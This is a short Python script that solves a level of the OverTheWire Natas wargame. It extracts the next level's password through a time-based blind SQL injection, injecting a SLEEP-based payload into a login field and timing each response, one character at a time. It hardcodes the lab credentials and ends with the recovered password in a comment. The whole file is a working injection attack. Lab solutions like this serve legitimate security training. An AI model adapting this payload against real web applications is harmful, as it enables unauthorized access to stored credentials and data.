import requests as r
import time as t

chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'

username = 'natas17'
password = '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw'

url = 'http://' + username + '.natas.labs.overthewire.org/'

session = r.Session()
response = session.get(url, auth = (username, password))

cracked = [""]
while(True):
	for c in chars:
		startTime = t.time()
		tester = "".join(cracked) + c + '%" AND SLEEP(0.5) #'
		data = {'username':'natas18" AND password LIKE BINARY "' + tester}
		response = session.post(url, data, auth = (username, password))
		endTime = t.time()
		responseTime = endTime - startTime
		if(responseTime > 0.5):
			cracked.append(c)
			print("".join(cracked))
			break

# Run code and get pw -> xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP
